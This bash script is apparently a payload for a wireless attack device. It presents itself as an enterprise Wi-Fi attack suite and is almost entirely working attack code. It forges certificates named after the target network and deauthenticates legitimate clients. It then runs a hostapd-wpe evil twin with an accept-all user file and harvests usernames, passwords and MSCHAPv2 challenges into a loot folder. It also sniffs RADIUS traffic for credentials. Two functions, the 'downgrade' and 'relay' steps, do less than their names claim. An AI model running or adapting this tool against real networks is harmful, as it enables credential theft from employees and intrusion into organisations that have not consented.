#!/bin/bash
# ============================================================
# NullSec: RADIUS/802.1X Enterprise Attack Suite
# Author: bad-antics
# Description: Enterprise wireless attack toolkit targeting RADIUS and 802.1X
# Category: pager/enterprise
#
# UNIQUE FEATURES:
# - Evil Twin with RADIUS impersonation
# - EAP downgrade attacks (PEAP/TTLS/TLS)
# - Certificate cloning & impersonation
# - Inner credential capture (MSCHAPv2)
# - Relay attacks against RADIUS servers
# ============================================================

PAYLOAD_NAME="RADIUS Attack Suite"
VERSION="1.0.0"
LOOT="/root/loot/enterprise"
LOG="$LOOT/radius-attack.log"

init_payload() {
    mkdir -p "$LOOT"/{certs,creds,captures,configs}
    echo "[$(date)] $PAYLOAD_NAME started" >> "$LOG"
    NOTIFY "ENTERPRISE" "Initializing RADIUS attack..."
}

scan_enterprise() {
    NOTIFY "SCAN" "Detecting enterprise networks..."
    local RESULTS="$LOOT/captures/enterprise_scan_$(date +%Y%m%d_%H%M).csv"
    
    airodump-ng --output-format csv -w /tmp/entscan wlan0mon 2>/dev/null &
    sleep 20
    kill $! 2>/dev/null
    
    # Filter WPA-Enterprise (MGT key management)
    grep -i "MGT\|802.1X\|EAP" /tmp/entscan*.csv 2>/dev/null > "$RESULTS"
    
    ENT_COUNT=$(wc -l < "$RESULTS" 2>/dev/null || echo 0)
    NOTIFY "SCAN" "Found $ENT_COUNT enterprise networks"
    
    # Identify EAP types from probe responses
    tshark -r /tmp/entscan*.cap -Y "eap" -T fields -e eap.type 2>/dev/null | sort -u | while read -r eap_type; do
        case $eap_type in
            25) echo "[EAP] PEAP detected" >> "$LOG" ;;
            21) echo "[EAP] EAP-TTLS detected" >> "$LOG" ;;
            13) echo "[EAP] EAP-TLS detected" >> "$LOG" ;;
            43) echo "[EAP] EAP-FAST detected" >> "$LOG" ;;
        esac
    done
    
    rm -f /tmp/entscan* 2>/dev/null
}

generate_fake_cert() {
    local TARGET_ESSID="$1"
    NOTIFY "CERT" "Generating impersonation certificate..."
    
    local CERT_DIR="$LOOT/certs"
    
    # Generate CA
    openssl req -new -x509 -days 365 -nodes \
        -keyout "$CERT_DIR/ca.key" -out "$CERT_DIR/ca.pem" \
        -subj "/C=US/ST=Corporate/L=Office/O=$TARGET_ESSID/CN=$TARGET_ESSID Root CA" 2>/dev/null
    
    # Generate server cert signed by fake CA
    openssl req -new -nodes \
        -keyout "$CERT_DIR/server.key" -out "$CERT_DIR/server.csr" \
        -subj "/C=US/ST=Corporate/L=Office/O=$TARGET_ESSID/CN=radius.$TARGET_ESSID.local" 2>/dev/null
    
    openssl x509 -req -days 365 \
        -in "$CERT_DIR/server.csr" -CA "$CERT_DIR/ca.pem" -CAkey "$CERT_DIR/ca.key" \
        -CAcreateserial -out "$CERT_DIR/server.pem" 2>/dev/null
    
    # DH params
    openssl dhparam -out "$CERT_DIR/dh.pem" 1024 2>/dev/null
    
    echo "[$(date)] Fake certificate generated for $TARGET_ESSID" >> "$LOG"
}

evil_twin_radius() {
    local BSSID="$1" ESSID="$2" CHANNEL="$3"
    NOTIFY "EVIL-TWIN" "Setting up rogue RADIUS for $ESSID..."
    
    generate_fake_cert "$ESSID"
    
    # FreeRADIUS config for credential capture
    local RAD_DIR="$LOOT/configs"
    cat > "$RAD_DIR/hostapd-wpe.conf" << HAPD
interface=wlan1
driver=nl80211
ssid=$ESSID
channel=$CHANNEL
hw_mode=g
ieee8021x=1
eapol_key_index_workaround=0
eap_server=1
eap_user_file=$RAD_DIR/eap_users
ca_cert=$LOOT/certs/ca.pem
server_cert=$LOOT/certs/server.pem
private_key=$LOOT/certs/server.key
dh_file=$LOOT/certs/dh.pem
eap_fast_a_id=101010101010101010101010101010
eap_fast_a_id_info=hostapd-wpe
eap_fast_prov=3
pac_key_lifetime=604800
pac_key_refresh_time=86400
pac_opaque_encr_key=000102030405060708090a0b0c0d0e0f
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
HAPD
    
    cat > "$RAD_DIR/eap_users" << EAP
* PEAP,TTLS,TLS,FAST
"t" TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2 "t" [2]
EAP
    
    # Deauth legitimate clients
    aireplay-ng -0 10 -a "$BSSID" wlan0mon 2>/dev/null &
    
    # Start evil twin RADIUS
    if command -v hostapd-wpe &>/dev/null; then
        hostapd-wpe "$RAD_DIR/hostapd-wpe.conf" 2>&1 | tee -a "$LOOT/creds/wpe_capture.txt" &
    else
        hostapd "$RAD_DIR/hostapd-wpe.conf" 2>&1 | tee -a "$LOOT/creds/hostapd_capture.txt" &
    fi
    local WPE_PID=$!
    
    NOTIFY "CAPTURE" "Evil twin RADIUS active, waiting for connections..."
    sleep 120
    
    kill $WPE_PID 2>/dev/null
    
    # Extract captured credentials
    grep -i "username\|password\|challenge\|response\|mschapv2" \
        "$LOOT/creds/wpe_capture.txt" 2>/dev/null >> "$LOOT/creds/extracted_$(date +%Y%m%d_%H%M).txt"
    
    CREDS=$(grep -c "username" "$LOOT/creds/wpe_capture.txt" 2>/dev/null || echo 0)
    echo "[$(date)] Evil twin captured $CREDS credential sets from $ESSID" >> "$LOG"
    NOTIFY "CAPTURE" "Captured $CREDS credential sets"
}

eap_downgrade() {
    local BSSID="$1" ESSID="$2"
    NOTIFY "DOWNGRADE" "EAP downgrade on $ESSID..."
    
    # Force clients to negotiate weaker EAP
    # EAP-GTC captures plaintext passwords
    echo "[$(date)] EAP downgrade attempt on $ESSID" >> "$LOG"
    
    cat > "$LOOT/configs/eap_users_downgrade" << EAP
* PEAP,TTLS
"t" GTC "t" [2]
EAP
    
    NOTIFY "DOWNGRADE" "Configured GTC inner method for plaintext capture"
}

relay_attack() {
    local RADIUS_IP="$1" RADIUS_SECRET="$2"
    NOTIFY "RELAY" "RADIUS relay attack..."
    
    # Set up relay between client and legitimate RADIUS
    echo "[$(date)] RADIUS relay: $RADIUS_IP" >> "$LOG"
    
    # Capture relayed credentials
    tcpdump -i wlan0mon -w "$LOOT/captures/radius_relay.pcap" \
        "udp port 1812 or udp port 1813" 2>/dev/null &
    local CAP_PID=$!
    
    sleep 60
    kill $CAP_PID 2>/dev/null
    
    # Extract RADIUS attributes
    tshark -r "$LOOT/captures/radius_relay.pcap" -Y "radius" \
        -T fields -e radius.User_Name -e radius.User_Password \
        2>/dev/null >> "$LOOT/creds/radius_relay_creds.txt"
}

main() {
    init_payload
    scan_enterprise
    
    # Process targets
    cat "$LOOT/captures/"enterprise_scan_*.csv 2>/dev/null | head -5 | while IFS=',' read -r bssid _ _ ch _ _ _ _ _ _ _ essid _; do
        bssid=$(echo "$bssid" | tr -d ' ')
        essid=$(echo "$essid" | tr -d ' ')
        ch=$(echo "$ch" | tr -d ' ')
        [ -z "$bssid" ] && continue
        
        evil_twin_radius "$bssid" "$essid" "${ch:-6}"
    done
    
    TOTAL_CREDS=$(find "$LOOT/creds" -name "*.txt" -exec grep -c "username\|password" {} + 2>/dev/null | awk -F: '{sum+=$2} END {print sum}')
    NOTIFY "DONE" "RADIUS attack complete: $TOTAL_CREDS credentials"
}

main "$@"
